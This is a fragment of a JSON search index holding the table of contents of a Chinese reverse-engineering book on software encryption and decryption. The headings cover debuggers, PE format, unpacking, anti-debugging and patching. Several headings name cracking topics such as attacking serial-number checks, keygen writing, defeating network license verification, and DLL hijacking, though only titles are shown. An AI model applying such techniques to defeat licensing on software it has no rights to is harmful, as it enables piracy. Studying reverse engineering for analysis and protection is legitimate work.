            "text": "目录\n\n\n第一篇  基础篇\n\n\n第1章  基础知识 2\n\n\n1.1  文本字符 2\n\n\n1.1.1  字节存储顺序 2\n\n\n1.1.2  ASCII与Unicode字符集 2\n\n\n1.2  Windows操作系统 4\n1.2.1  Win API简介 4\n1.2.2  常用Win32 API函数 5\n1.2.3  什么是句柄 7\n1.2.4  Windows 9x与Unicode 7\n1.2.5  Windows NT/2000/XP与Unicode 8\n1.2.6  Windows消息机制 9\n1.3  保护模式简介 10\n1.3.1  虚拟内存 10\n1.3.2  保护模式的权限级别 11\n1.4  认识PE格式 12\n\n\n第二篇  调试篇\n\n\n第2章  动态分析技术 16\n\n\n2.1  OllyDbg调试器 16\n\n\n2.1.1  OllyDbg界面 16\n\n\n2.1.2  OllyDbg的配置 18\n\n\n2.1.3  加载程序 19\n\n\n2.1.4  基本操作 20\n\n\n2.1.5  断点 30\n\n\n2.1.6  插件 38\n\n\n2.1.7  Run trace 39\n\n\n2.1.8  Hit trace 40\n\n\n2.1.9  符号调试技术 40\n\n\n2.1.10  OllyDbg常见问题 42\n\n\n2.2  SoftICE调试器 43\n\n\n第3章  静态分析技术 44\n\n\n3.1  文件类型分析 44\n3.1.1  PEiD工具 44\n3.1.2  FileInfo工具 45\n3.2  静态反汇编 45\n3.2.1  反汇编引擎 45\n3.2.2  IDA Pro简介 46\n3.2.3  IDA的配置 46\n3.2.4  IDA主窗口界面 48\n3.2.5  交叉参考 49\n3.2.6  参考重命名 49\n3.2.7  标签的用法 50\n3.2.8  进制的转换 50\n3.2.9  代码和数据转换 51\n3.2.10  字符串 51\n3.2.11  数组 53\n3.2.12  结构体 53\n3.2.13  枚举类型 57\n3.2.14  堆栈变量 58\n3.2.15  IDC脚本 59\n3.2.16  FLIRT 62\n3.2.17  插件 63\n3.2.18  其他功能 63\n3.2.19  小结 64\n3.3  可执行文件的修改 64\n3.4  静态分析技术应用实例 67\n3.4.1  解密初步 67\n3.4.2  逆向工程初步 69\n\n\n第4章  逆向分析技术 71\n\n\n4.1  启动函数 71\n\n\n4.2  函  数 72\n\n\n4.2.1  函数的识别 72\n\n\n4.2.2  函数的参数 73\n\n\n4.2.3  函数的返回值 78\n\n\n4.3  数据结构 80\n\n\n4.3.1  局部变量 80\n\n\n4.3.2  全局变量 81\n\n\n4.3.3  数组 83\n\n\n4.4  虚函数 84\n\n\n4.5  控制语句 86\n\n\n4.5.1  IF-THEN-ELSE语句 86\n\n\n4.5.2  SWITCH-CASE语句 87\n\n\n4.5.3  转移指令机器码的计算 89\n\n\n4.5.4  条件设置指令（SETcc） 91\n\n\n4.5.5  纯算法实现逻辑判断 92\n\n\n4.6  循环语句 93\n\n\n4.7  数学运算符 94\n\n\n4.7.1  整数的加法和减法 94\n\n\n4.7.2  整数的乘法 94\n\n\n4.7.3  整数的除法 95\n\n\n4.8  文本字符串 97\n\n\n4.8.1  字符串存储格式 97\n\n\n4.8.2  字符寻址指令 98\n\n\n4.8.3  字母大小写转换 98\n\n\n4.8.4  计算字符串的长度 99\n\n\n4.9  指令修改技巧 99\n\n\n第三篇  解密篇\n\n\n第5章  常见的演示版保护技术 102\n\n\n5.1  序列号保护方式 102\n\n\n5.1.1  序列号保护机制 102\n\n\n5.1.2  如何攻击序列号保护 104\n\n\n5.1.3  字符串比较形式 105\n\n\n5.1.4  注册机制作 106\n\n\n5.2  警告（Nag）窗口 111\n\n\n5.3  时间限制 113\n\n\n5.3.1  计时器 113\n\n\n5.3.2  时间限制 114\n\n\n5.3.3  拆解时间限制保护 114\n\n\n5.4  菜单功能限制 115\n\n\n5.4.1  相关函数 115\n\n\n5.4.2  拆解菜单限制保护 116\n\n\n5.5  KeyFile保护 116\n\n\n5.5.1  相关API函数 116\n\n\n5.5.2  拆解KeyFile保护 117\n\n\n5.6  网络验证 121\n\n\n5.6.1  相关函数 121\n\n\n5.6.2  网络验证破解一般思路 121\n\n\n5.7  CD-Check 126\n\n\n5.7.1  相关函数 127\n\n\n5.7.2  拆解光盘保护 128\n\n\n5.8  只运行一个实例 128\n\n\n5.8.1  实现方法 128\n\n\n5.8.2  实例 129\n\n\n5.9  常用断点设置技巧 129\n\n\n第6章  加密算法 131\n\n\n6.1  单向散列算法 131\n\n\n6.1.1  MD5算法 131\n\n\n6.1.2  SHA算法 136\n\n\n6.1.3  小结 139\n\n\n6.2  对称加密算法 139\n\n\n6.2.1  RC4流密码 140\n\n\n6.2.2  TEA算法 141\n\n\n6.2.3  IDEA算法 144\n\n\n6.2.4  BlowFish算法 151\n\n\n6.2.5  AES算法 155\n\n\n6.2.6  对称加密算法小结 167\n\n\n6.3  公开密钥加密算法 167\n\n\n6.3.1  RSA算法 168\n\n\n6.3.2  ElGamal公钥算法 173\n\n\n6.3.3  DSA数字签名算法 179\n\n\n6.3.4  椭圆曲线密码编码学（Elliptic Curve Cryptography） 180\n\n\n6.4  其他算法 186\n\n\n6.4.1  CRC32算法 186\n\n\n6.4.2  Base64编码 187\n\n\n6.5  常见的加密库接口及其识别 188\n\n\n6.5.1  Miracl大数运算库 189\n\n\n6.5.2  FGInt 190\n\n\n6.5.3  其他加密算法库介绍 191\n\n\n第四篇  语言和平台篇\n\n\n第7章  Delphi程序 194\n\n\n7.1  DeDe反编译器 194\n\n\n7.2  按钮事件代码 197\n\n\n7.3  模块初始化与结束化 197\n\n\n第8章  Visual Basic程序 200\n\n\n8.1  基础知识 200\n\n\n8.1.1  字符编码方式 200\n\n\n8.1.2  编译模式 200\n\n\n8.2  自然编译（Native） 201\n\n\n8.2.1  相关VB函数 201\n\n\n8.2.2  VB程序比较方式 201\n\n\n8.3  伪编译 206\n\n\n8.3.1  虚拟机与伪代码 206\n\n\n8.3.2  动态分析VB P-code程序 208\n\n\n8.3.3  伪代码的综合分析 211\n\n\n8.3.4  VB P-code攻击实战 213\n\n\n第9章  .NET平台加解密 218\n\n\n9.1  .Net概述 218\n\n\n9.1.1  什么是.Net 218\n\n\n9.1.2  几个基本概念 218\n\n\n9.1.3  第一个.Net程序 219\n\n\n9.2  MSIL与元数据 220\n\n\n9.2.1  PE结构的扩展 220\n\n\n9.2.2  .Net下的汇编MSIL 226\n\n\n9.2.3  MSIL与元数据的结合 228\n\n\n9.3  代码分析技术 230\n\n\n9.3.1  静态分析 230\n\n\n9.3.2  动态调试 232\n\n\n9.3.3  代码修改 234\n\n\n9.4  代码保护技术及其逆向 235\n\n\n9.4.1  强名称 235\n\n\n9.4.2  名称混淆 238\n\n\n9.4.3  流程混淆 241\n\n\n9.4.4  压缩 243\n\n\n9.4.5  加密 247\n\n\n9.4.6  其他保护手段 253\n\n\n9.5  深入.Net 254\n\n\n9.5.1  反射与CodeDOM 254\n\n\n9.5.2  Unmaganed API 256\n\n\n9.5.3  Rotor、MONO与.Net内核 258\n\n\n第五篇  系统篇\n\n\n第10章  PE文件格式 262\n\n\n10.1  PE的基本概念 263\n\n\n10.1.1  基地址 264\n\n\n10.1.2  相对虚拟地址 264\n\n\n10.1.3  文件偏移地址 265\n\n\n10.2  MS-DOS头部 265\n\n\n10.3  PE文件头 266\n\n\n10.3.1  Signature字段 266\n\n\n10.3.2  IMAGE_FILE_HEADER结构 267\n\n\n10.3.3  IMAGE_OPTIONAL_HEADER结构 268\n\n\n10.4  区块 272\n\n\n10.4.1  区块表 272\n\n\n10.4.2  各种区块的描述 274\n\n\n10.4.3  区块的对齐值 276\n\n\n10.4.4  文件偏移与虚拟地址转换 276\n\n\n10.5  输入表 278\n\n\n10.5.1  输入函数的调用 278\n\n\n10.5.2  输入表结构 279\n\n\n10.5.3  输入地址表（IAT） 281\n\n\n10.5.4  输入表实例分析 281\n\n\n10.6  绑定输入 285\n\n\n10.7  输出表 286\n\n\n10.7.1  输出表结构 287\n\n\n10.7.2  输出表结构实例分析 288\n\n\n10.8  基址重定位 289\n\n\n10.8.1  基址重定位概念 289\n\n\n10.8.2  基址重定位结构定义 290\n\n\n10.8.3  基址重定位结构实例分析 291\n\n\n10.9  资源 292\n\n\n10.9.1  资源结构 292\n\n\n10.9.2  资源结构实例分析 295\n\n\n10.9.3  资源编辑工具 297\n\n\n10.10  TLS初始化 297\n\n\n10.11  调试目录 297\n\n\n10.12  延迟装入数据 298\n\n\n10.13  程序异常数据 299\n\n\n10.14  .Net头部 299\n\n\n10.15  编写PE分析工具 300\n\n\n10.15.1  文件格式检查 300\n\n\n10.15.2  FileHeader和OptionalHeader内容的读取 300\n\n\n10.15.3  得到数据目录表信息 302\n\n\n10.15.4  得到区块表信息 302\n\n\n10.15.5  得到输出表信息 303\n\n\n10.15.6  得到输入表信息 304\n\n\n第11章  结构化异常处理 306\n\n\n11.1  基本概念 306\n\n\n11.1.1  异常列表 306\n\n\n11.1.2  异常处理的基本过程 307\n\n\n11.1.3  SEH的分类 308\n\n\n11.2  SEH相关数据结构 308\n\n\n11.2.1  TEB结构 308\n\n\n11.2.2  EXCEPTION_REGISTRATION结构 311\n\n\n11.2.3  EXCEPTION_POINTERS、EXCEPTION RECORD、\n\n\n11.2.3  CONTEXT 313\n\n\n11.3  异常处理回调函数 312\n\n\n第六篇  脱壳篇\n\n\n第12章  专用加密软件 316\n\n\n12.1  认识壳 316\n\n\n12.1.1  壳的概念 316\n\n\n12.1.2  压缩引擎 317\n\n\n12.2  压缩壳 317\n\n\n12.2.1  UPX 318\n\n\n12.2.2  ASPack 318\n\n\n12.3  加密壳 318\n\n\n12.3.1  ASProtect 318\n\n\n12.3.2  Armadillo 319\n\n\n12.3.3  EXECryptor 320\n\n\n12.3.4  Themida 320\n\n\n12.4  虚拟机保护软件 321\n\n\n12.4.1  虚拟机介绍 321\n\n\n12.4.2  VMProtect简介 321\n\n\n第13章  脱壳技术 324\n\n\n13.1  基础知识 324\n\n\n13.1.1  壳的加载过程 324\n\n\n13.1.2  脱壳机 326\n\n\n13.1.3  手动脱壳 326\n\n\n13.2  寻找OEP 326\n\n\n13.2.1  根据跨段指令寻找OEP 326\n\n\n13.2.2  用内存访问断点找OEP 330\n\n\n13.2.3  根据堆栈平衡原理找OEP 331\n\n\n13.2.4  根据编译语言特点找OEP 332\n\n\n13.3  抓取内存映像 332\n\n\n13.3.1  Dump原理 332\n\n\n13.3.2  反Dump技术（Anti-Dump） 334\n\n\n13.4  重建输入表 336\n\n\n13.4.1  输入表重建的原理 336\n\n\n13.4.2  确定IAT的地址和大小 337\n\n\n13.4.3  根据IAT重建输入表 338\n\n\n13.4.4  ImportREC重建输入表 340\n\n\n13.4.5  输入表加密概括 344\n\n\n13.5  DLL文件脱壳 345\n\n\n13.5.1  寻找OEP 345\n\n\n13.5.2  Dump映像文件 347\n\n\n13.5.3  重建DLL的输入表 348\n\n\n13.5.4  构造重定位表 349\n\n\n13.6  附加数据 351\n\n\n13.7  PE文件的优化 353\n\n\n13.8  压缩壳 356\n\n\n13.8.1  UPX外壳 3565\n\n\n13.8.2  ASPack外壳 359\n\n\n13.9  加密壳 363\n\n\n13.9.1  ASProtect 363\n\n\n13.9.2  Themidia的SDK分析 367\n\n\n13.10  静态脱壳 372\n\n\n13.10.1  外壳Loader的分析 372\n\n\n13.10.2  编写静态脱壳器 377\n\n\n第七篇  保护篇\n\n\n第14章  软件保护技术 380\n\n\n14.1  防范算法求逆 380\n\n\n14.1.1  基本概念 380\n\n\n14.1.2  堡垒战术 381\n\n\n14.1.3  游击战术 382\n\n\n14.2  抵御静态分析 383\n\n\n14.2.1  花指令 383\n\n\n14.2.2  SMC技术实现 385\n\n\n14.2.3  信息隐藏 390\n\n\n14.2.4  简单的多态变形技术 391\n\n\n14.3  文件完整性检验 392\n\n\n14.3.1  磁盘文件校验实现 392\n\n\n14.3.2  校验和（Checksum） 393\n\n\n14.3.3  内存映像校验 393\n\n\n14.4  代码与数据结合技术 395\n\n\n14.4.1  准备工作 396\n\n\n14.4.2  加密算法选用 397\n\n\n14.4.3  手动加密代码 397\n\n\n14.4.4  使.text区块可写 399\n\n\n14.5  软件保护的若干忠告 399\n\n\n第15章  反跟踪技术 401\n\n\n15.1  由BeingDebugged引发的蝴蝶效应 401\n\n\n15.1.1  BeingDebugged 401\n\n\n15.1.2  NtGlobalFlag 405\n\n\n15.1.3  Heap Magic 407\n\n\n15.1.4  从源头消灭BeingDebugged 412\n\n\n15.2  回归Native：用户态的梦魇 413\n\n\n15.2.1  CheckRemoteDebuggerPresent 413\n\n\n15.2.2  ProcessDebugPort 414\n\n\n15.2.3  ThreadHideFromDebugger 416\n\n\n15.2.4  Debug Object 419\n\n\n15.2.5  SystemKernelDebuggerInformation 423\n\n\n15.2.6  Native API 425\n\n\n15.2.7  Hook和AntiHook 430\n\n\n15.3  真正的奥秘：小技巧一览 433\n\n\n15.3.1  SoftICE检测方法 433\n\n\n15.3.2  OllyDbg检测方法 435\n\n\n15.3.3  调试器漏洞 437\n\n\n15.3.4  防止调试器附加 438\n\n\n15.3.5  父进程检测 440\n\n\n15.3.6  时间差 440\n\n\n15.3.7  通过Trap Flag检测 441\n\n\n15.3.8  双进程保护 441\n\n\n第16章  外壳编写基础 442\n\n\n16.1  外壳的结构 442\n\n\n16.2  加壳主程序 443\n\n\n16.2.1  判断文件是否为PE格式 443\n\n\n16.2.2  文件基本数据读入 443\n\n\n16.2.3  附加数据读取 445\n\n\n16.2.4  输入表处理 445\n\n\n16.2.5  重定位表处理 448\n\n\n16.2.6  文件的压缩 450\n\n\n16.2.7  资源数据处理 453\n\n\n16.2.8  区块的融合 457\n\n\n16.3  外壳部分编写 457\n\n\n16.3.1  外壳的加载过程 458\n\n\n16.3.2  自建输入表 458\n\n\n16.3.3  外壳引导段 459\n\n\n16.3.4  外壳第二段 462\n\n\n16.4  将外壳部分添加至原程序 467\n\n\n第17章  虚拟机的设计 471\n\n\n17.1  原理 471\n\n\n17.1.1  反汇编引擎 472\n\n\n17.1.2  指令分类 472\n\n\n17.2  启动框架和调用约定 473\n\n\n17.2.1  调度器VStartVM 473\n\n\n17.2.2  虚拟环境：VMContext 474\n\n\n17.2.3  平衡堆栈：VBegin和VCheckEsp 474\n\n\n17.3  Handler的设计 475\n\n\n17.3.1  辅助Handler 475\n\n\n17.3.2  普通Handler和指令拆解 476\n\n\n17.3.3  标志位问题 477\n\n\n17.3.4  相同作用的指令 478\n\n\n17.3.5  转移指令 478\n\n\n17.3.6  转移跳转指令的另一种实现 479\n\n\n17.3.7  call指令 480\n\n\n17.3.8  retn指令 481\n\n\n17.3.9  不可模拟指令 481\n\n\n17.4  托管代码的异常处理 482\n\n\n17.4.1  VC++的异常处理 482\n\n\n17.4.2  Delphi的异常处理 486\n\n\n17.5  小结 490\n\n\n第八篇  PEDIY篇\n\n\n第18章  补丁技术 492\n\n\n18.1  文件补丁 492\n\n\n18.2  内存补丁 493\n\n\n18.2.1  跨进程内存存取机制 493\n\n\n18.2.2  Debug API机制 495\n\n\n18.2.3  利用调试寄存器机制 498\n\n\n18.2.4  DLL劫持技术 501\n\n\n18.3  SMC补丁技术 505\n\n\n18.3.1  单层SMC补丁技术 505\n\n\n18.3.2  多层SMC补丁技术 506\n\n\n18.4  补丁工具 508\n\n\n第19章  代码的二次开发 510\n\n\n19.1  数据对齐 510\n\n\n19.2  增加空间 510\n\n\n19.2.1  区块间隙 510\n\n\n19.2.2  手工构造区块 511\n\n\n19.2.3  工具辅助构造区块 512\n\n\n19.3  获得函数的调用 512\n\n\n19.3.1  增加输入函数 513\n\n\n19.3.2  显式链接调用DLL 514\n\n\n19.4  代码的重定位 514\n\n\n19.4.1  修复重定位表 514\n\n\n19.4.2  代码的自定位技术 516\n\n\n19.5  增加输出函数 517\n\n\n19.6  消息循环 518\n\n\n19.6.1  WndProc函数 518\n\n\n19.6.2  寻找消息循环 519\n\n\n19.6.3  WndProc汇编形式 520\n\n\n19.7  修改WndProc扩充功能 521\n\n\n19.7.1  扩充WndProc 521\n\n\n19.7.2  扩充Exit菜单功能 522\n\n\n19.7.3  扩充Open菜单功能 522\n\n\n19.8  增加接口 525\n\n\n19.8.1  用DLL增加功能 525\n\n\n19.8.2  扩展消息循环 526\n\n\n附录A  浮点指令 531528\n\n\n附录B  在Visual C++中使用内联汇编 537534", 
            "title": "目录"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#_1", 
            "text": "", 
            "title": "目录"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#_2", 
            "text": "", 
            "title": "第一篇  基础篇"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#1-2", 
            "text": "", 
            "title": "第1章  基础知识 2"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#11-2", 
            "text": "", 
            "title": "1.1  文本字符 2"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#111-2", 
            "text": "", 
            "title": "1.1.1  字节存储顺序 2"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#112-asciiunicode-2", 
            "text": "1.2  Windows操作系统 4\n1.2.1  Win API简介 4\n1.2.2  常用Win32 API函数 5\n1.2.3  什么是句柄 7\n1.2.4  Windows 9x与Unicode 7\n1.2.5  Windows NT/2000/XP与Unicode 8\n1.2.6  Windows消息机制 9\n1.3  保护模式简介 10\n1.3.1  虚拟内存 10\n1.3.2  保护模式的权限级别 11\n1.4  认识PE格式 12", 
            "title": "1.1.2  ASCII与Unicode字符集 2"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#_3", 
            "text": "", 
            "title": "第二篇  调试篇"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#2-16", 
            "text": "", 
            "title": "第2章  动态分析技术 16"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#21-ollydbg-16", 
            "text": "", 
            "title": "2.1  OllyDbg调试器 16"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#211-ollydbg-16", 
            "text": "", 
            "title": "2.1.1  OllyDbg界面 16"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#212-ollydbg-18", 
            "text": "", 
            "title": "2.1.2  OllyDbg的配置 18"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#213-19", 
            "text": "", 
            "title": "2.1.3  加载程序 19"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#214-20", 
            "text": "", 
            "title": "2.1.4  基本操作 20"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#215-30", 
            "text": "", 
            "title": "2.1.5  断点 30"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#216-38", 
            "text": "", 
            "title": "2.1.6  插件 38"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#217-run-trace-39", 
            "text": "", 
            "title": "2.1.7  Run trace 39"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#218-hit-trace-40", 
            "text": "", 
            "title": "2.1.8  Hit trace 40"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#219-40", 
            "text": "", 
            "title": "2.1.9  符号调试技术 40"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#2110-ollydbg-42", 
            "text": "", 
            "title": "2.1.10  OllyDbg常见问题 42"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#22-softice-43", 
            "text": "", 
            "title": "2.2  SoftICE调试器 43"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#3-44", 
            "text": "3.1  文件类型分析 44\n3.1.1  PEiD工具 44\n3.1.2  FileInfo工具 45\n3.2  静态反汇编 45\n3.2.1  反汇编引擎 45\n3.2.2  IDA Pro简介 46\n3.2.3  IDA的配置 46\n3.2.4  IDA主窗口界面 48\n3.2.5  交叉参考 49\n3.2.6  参考重命名 49\n3.2.7  标签的用法 50\n3.2.8  进制的转换 50\n3.2.9  代码和数据转换 51\n3.2.10  字符串 51\n3.2.11  数组 53\n3.2.12  结构体 53\n3.2.13  枚举类型 57\n3.2.14  堆栈变量 58\n3.2.15  IDC脚本 59\n3.2.16  FLIRT 62\n3.2.17  插件 63\n3.2.18  其他功能 63\n3.2.19  小结 64\n3.3  可执行文件的修改 64\n3.4  静态分析技术应用实例 67\n3.4.1  解密初步 67\n3.4.2  逆向工程初步 69", 
            "title": "第3章  静态分析技术 44"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#4-71", 
            "text": "", 
            "title": "第4章  逆向分析技术 71"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#41-71", 
            "text": "", 
            "title": "4.1  启动函数 71"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#42-72", 
            "text": "", 
            "title": "4.2  函  数 72"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#421-72", 
            "text": "", 
            "title": "4.2.1  函数的识别 72"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#422-73", 
            "text": "", 
            "title": "4.2.2  函数的参数 73"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#423-78", 
            "text": "", 
            "title": "4.2.3  函数的返回值 78"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#43-80", 
            "text": "", 
            "title": "4.3  数据结构 80"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#431-80", 
            "text": "", 
            "title": "4.3.1  局部变量 80"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#432-81", 
            "text": "", 
            "title": "4.3.2  全局变量 81"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#433-83", 
            "text": "", 
            "title": "4.3.3  数组 83"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#44-84", 
            "text": "", 
            "title": "4.4  虚函数 84"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#45-86", 
            "text": "", 
            "title": "4.5  控制语句 86"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#451-if-then-else-86", 
            "text": "", 
            "title": "4.5.1  IF-THEN-ELSE语句 86"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#452-switch-case-87", 
            "text": "", 
            "title": "4.5.2  SWITCH-CASE语句 87"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#453-89", 
            "text": "", 
            "title": "4.5.3  转移指令机器码的计算 89"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#454-setcc-91", 
            "text": "", 
            "title": "4.5.4  条件设置指令（SETcc） 91"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#455-92", 
            "text": "", 
            "title": "4.5.5  纯算法实现逻辑判断 92"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#46-93", 
            "text": "", 
            "title": "4.6  循环语句 93"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#47-94", 
            "text": "", 
            "title": "4.7  数学运算符 94"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#471-94", 
            "text": "", 
            "title": "4.7.1  整数的加法和减法 94"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#472-94", 
            "text": "", 
            "title": "4.7.2  整数的乘法 94"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#473-95", 
            "text": "", 
            "title": "4.7.3  整数的除法 95"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#48-97", 
            "text": "", 
            "title": "4.8  文本字符串 97"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#481-97", 
            "text": "", 
            "title": "4.8.1  字符串存储格式 97"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#482-98", 
            "text": "", 
            "title": "4.8.2  字符寻址指令 98"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#483-98", 
            "text": "", 
            "title": "4.8.3  字母大小写转换 98"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#484-99", 
            "text": "", 
            "title": "4.8.4  计算字符串的长度 99"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#49-99", 
            "text": "", 
            "title": "4.9  指令修改技巧 99"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#_4", 
            "text": "", 
            "title": "第三篇  解密篇"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#5-102", 
            "text": "", 
            "title": "第5章  常见的演示版保护技术 102"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#51-102", 
            "text": "", 
            "title": "5.1  序列号保护方式 102"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#511-102", 
            "text": "", 
            "title": "5.1.1  序列号保护机制 102"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#512-104", 
            "text": "", 
            "title": "5.1.2  如何攻击序列号保护 104"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#513-105", 
            "text": "", 
            "title": "5.1.3  字符串比较形式 105"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#514-106", 
            "text": "", 
            "title": "5.1.4  注册机制作 106"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#52-nag-111", 
            "text": "", 
            "title": "5.2  警告（Nag）窗口 111"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#53-113", 
            "text": "", 
            "title": "5.3  时间限制 113"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#531-113", 
            "text": "", 
            "title": "5.3.1  计时器 113"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#532-114", 
            "text": "", 
            "title": "5.3.2  时间限制 114"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#533-114", 
            "text": "", 
            "title": "5.3.3  拆解时间限制保护 114"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#54-115", 
            "text": "", 
            "title": "5.4  菜单功能限制 115"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#541-115", 
            "text": "", 
            "title": "5.4.1  相关函数 115"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#542-116", 
            "text": "", 
            "title": "5.4.2  拆解菜单限制保护 116"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#55-keyfile-116", 
            "text": "", 
            "title": "5.5  KeyFile保护 116"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#551-api-116", 
            "text": "", 
            "title": "5.5.1  相关API函数 116"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#552-keyfile-117", 
            "text": "", 
            "title": "5.5.2  拆解KeyFile保护 117"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#56-121", 
            "text": "", 
            "title": "5.6  网络验证 121"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#561-121", 
            "text": "", 
            "title": "5.6.1  相关函数 121"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#562-121", 
            "text": "", 
            "title": "5.6.2  网络验证破解一般思路 121"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#57-cd-check-126", 
            "text": "", 
            "title": "5.7  CD-Check 126"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#571-127", 
            "text": "", 
            "title": "5.7.1  相关函数 127"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#572-128", 
            "text": "", 
            "title": "5.7.2  拆解光盘保护 128"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#58-128", 
            "text": "", 
            "title": "5.8  只运行一个实例 128"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#581-128", 
            "text": "", 
            "title": "5.8.1  实现方法 128"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#582-129", 
            "text": "", 
            "title": "5.8.2  实例 129"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#59-129", 
            "text": "", 
            "title": "5.9  常用断点设置技巧 129"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#6-131", 
            "text": "", 
            "title": "第6章  加密算法 131"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#61-131", 
            "text": "", 
            "title": "6.1  单向散列算法 131"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#611-md5-131", 
            "text": "", 
            "title": "6.1.1  MD5算法 131"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#612-sha-136", 
            "text": "", 
            "title": "6.1.2  SHA算法 136"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#613-139", 
            "text": "", 
            "title": "6.1.3  小结 139"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#62-139", 
            "text": "", 
            "title": "6.2  对称加密算法 139"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#621-rc4-140", 
            "text": "", 
            "title": "6.2.1  RC4流密码 140"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#622-tea-141", 
            "text": "", 
            "title": "6.2.2  TEA算法 141"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#623-idea-144", 
            "text": "", 
            "title": "6.2.3  IDEA算法 144"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#624-blowfish-151", 
            "text": "", 
            "title": "6.2.4  BlowFish算法 151"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#625-aes-155", 
            "text": "", 
            "title": "6.2.5  AES算法 155"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#626-167", 
            "text": "", 
            "title": "6.2.6  对称加密算法小结 167"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#63-167", 
            "text": "", 
            "title": "6.3  公开密钥加密算法 167"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#631-rsa-168", 
            "text": "", 
            "title": "6.3.1  RSA算法 168"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/#632-elgamal-173", 
            "text": "", 
            "title": "6.3.2  ElGamal公钥算法 173"
        }, 
        {
